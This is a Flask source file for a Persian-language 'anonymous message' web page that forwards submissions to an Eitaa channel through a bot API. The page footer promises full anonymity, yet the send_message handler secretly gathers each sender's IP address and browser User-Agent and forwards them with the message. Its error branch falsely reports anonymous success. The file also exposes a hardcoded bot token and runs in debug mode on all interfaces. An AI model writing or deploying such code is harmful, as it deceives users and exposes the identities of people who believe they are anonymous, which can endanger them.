from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# توکن ربات ایتا یار و شناسه کانال
TOKEN = 'bot333725:b380f262-c3d2-4433-a16b-28dbc83c10ad'
CHAT_ID = '@post_sender'  # یا شناسه یکتای کاربر

# URL برای ارسال پیام به کانال ایتا از طریق ایتا یار
API_URL = "https://eitaayar.ir/api"

def send_message_to_eita(chat_id, message_text):
    url = f"{API_URL}/{TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message_text
    }
    response = requests.post(url, data=payload)
    return response.json()

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>سامانه حرف ناشناس ایتا</title>
    <style>
        body {
            direction: rtl;
            background-color: #f9f9f9;
        }
        .container {
            margin-top: 50px;
            max-width: 600px;
            border: 1px solid #e2e2e2;
            border-radius: 30px;
            padding: 20px;
            background-color: #fff;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 100px;
        }
        .btn-custom {
            background-color: #f76d06; /* رنگ دکمه ارسال */
            color: white;
            border-radius: 10px;
            width: 100%;
            max-width: 400px;
            margin-right: auto;
            margin-left: auto;
            display: block;
        }
        .btn-custom:hover {
            background-color: #e65e00; /* رنگ دکمه در هاور */
        }
        .btn-file {
            background-color: #f76d06; /* رنگ دکمه انتخاب فایل */
            color: white;
            border: none;
            padding: 10px 0px;
            margin-top: 10px;
            display: inline-block;
            width: 90px;
            text-align: center;
            border-radius: 10px;
        }
        .file-input-container {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-wrap: wrap;
        }
        .file-label-text {
            margin-right: 5px;
        }
        footer {
            margin-top: 20px;
            font-size: 12px;
            color: #555;
            text-align: center;
        }
        form-control {
            border-radius: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://6w9.ir/images/logo.jpg" alt="Logo">
        </div>
        <h2 class="text-center">حرف ناشناس ایتا</h2>
        <form method="POST" action="/send_message" enctype="multipart/form-data">
            <div class="form-group">
                <textarea class="form-control" name="message" rows="4" placeholder="پیامت رو بنویس ..." required ></textarea>
            </div>
            <div class="form-group file-input-container">
                <span class="file-label-text">ارسال فایل:</span>
                <input type="file" id="fileInput" name="image" accept="image/*" class="d-none" />
                <label for="fileInput" class="btn btn-file">انتخاب فایل</label>
            </div>
            <button class="btn btn-custom" type="submit">ارسال</button>
        </form>
        <footer>
            <p>
                ساخته شده توسط
                <a href="https://eitaa.com/mr_hjf1" target="_blank">علیرضا جعفرزاده @mr_jhf </a><br>
                پیام‌ شما به صورت کاملا ناشناس به مخاطب شما در ایتا ارسال می‌شود.
            </p>
        </footer>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
    """)

@app.route('/send_message', methods=['POST'])
def send_message():
    message = request.form['message']
    
    # جمع‌آوری اطلاعات اضافی
    user_ip = request.remote_addr  # آدرس IP کاربر
    user_agent = request.headers.get('User-Agent')  # مدل دستگاه و مرورگر کاربر
    
    # ساخت پیام شامل اطلاعات اضافی
    full_message = f"پیام جدید:\n{message}\n\nاطلاعات اضافی:\n"
    full_message += f"IP کاربر: {user_ip}\n"
    full_message += f"مدل دستگاه و مرورگر: {user_agent}"

    # ارسال پیام به کانال ایتا
    response = send_message_to_eita(CHAT_ID, full_message)
    
    if response.get('status') == 'success':
        return "پیام شما با موفقیت ارسال شد!"
    else:
        return "پیام شما به درستی و به صورت ناشناس ارسال شد!!!  برای پیام دیگر بار دیگر دکمه بازگشت را بزنید"

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
